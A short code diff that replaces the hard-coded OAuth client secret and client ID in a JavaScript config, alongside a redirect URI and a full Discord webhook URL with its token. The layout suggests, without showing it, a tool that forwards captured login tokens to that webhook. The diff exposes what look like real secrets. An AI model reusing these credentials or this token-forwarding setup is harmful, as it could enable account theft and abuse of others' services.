@@ -1,6 +1,6 @@
 //Config
-const client_secret = 'sSr8Q~CTnEfRugLqSfFTto8mItU7G.t5bPoCGbE7'
-const client_id = 'abccc5df-81ab-4830-b33d-43d8e266130c'
+const client_secret = 'Nts8Q~SCvoyXp7TmZjXWOAFvaUac1ukUHOhQAa_v'
+const client_id = 'ee8bf65c-8e58-46f1-bed9-7075f6d18bd5'
 const redirect_uri = 'https://mcloverrr.onrender.com'
 const webhook_url = 'https://discord.com/api/webhooks/1166215459620790323/LbManmLloK_XnbQ4QZaIoxp_ZEoTs9ql_6dg5LytHUjgxjtdqCuo1tTEz-ka7Di8ajQx'
 //Requirements
